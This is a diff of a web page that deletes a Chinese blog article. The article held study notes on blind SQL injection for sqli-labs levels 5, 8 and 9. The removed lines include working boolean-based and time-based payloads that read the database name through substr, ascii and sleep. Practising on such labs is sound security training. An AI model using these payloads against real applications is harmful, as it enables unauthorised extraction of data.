@@ -465,24 +465,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>1.left（）函数: <code>?id=1&#39; and left((select database()),1)=&#39;s&#39;--+</code>  判断数据库的第一位是否为s。</p>
-<p>2.substr：substr((select database()),1,1)=’s’   匹配的第一位开始算的第一个字母是否是s</p>
-<p>3.ascii与substr; <code>?id=1&#39; and ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1))&gt;50 --+</code></p>
-<p>或<code>?id=1&#39; and ascii(substr(select database()),1,1)&gt;50--+</code> 从第一位开始算的第一个字母</p>
-<p>ps：schemata limit 1,1)表示第二个数据库名的第一位</p>
-<p>less5为布尔盲注 正确时反回you are in 错误时不返回结果</p>
-<p>1.发现sql注入漏洞为’</p>
-<p>2.利用order  by 函数发现为三列</p>
-<p>（因为其为布尔型盲注故无法使用联合查询）</p>
-<p>3.使用上述函数进行查询</p>
-<p>less8可使用布尔盲注和时间盲注  这边就使用时间盲注吧</p>
-<p>if(条件，1，2)条件成立执行1 不成立执行2</p>
-<p>?id=1’ and if (length(database())=8,1,sleep(5))–+ 当长度为8时很快加载，不为8时加载5秒</p>
-<p>?id=1’ and if(ascii(substr((select database()),1,1))&gt;113,1,sleep(5))–+ 当前数据库从第一位开始算的第一个字母sacii值大于113 立刻返回结果否则执行5秒</p>
-<p>less9只能只能输出you are in  不存在true和false两种界面，所以建议使用时间盲注</p>
-<p>1.输入  ?id=1’ and sleep(5)–+  </p>
-<p>其余参照less8</p>
-
+                
                 
             </div>
             <hr/>
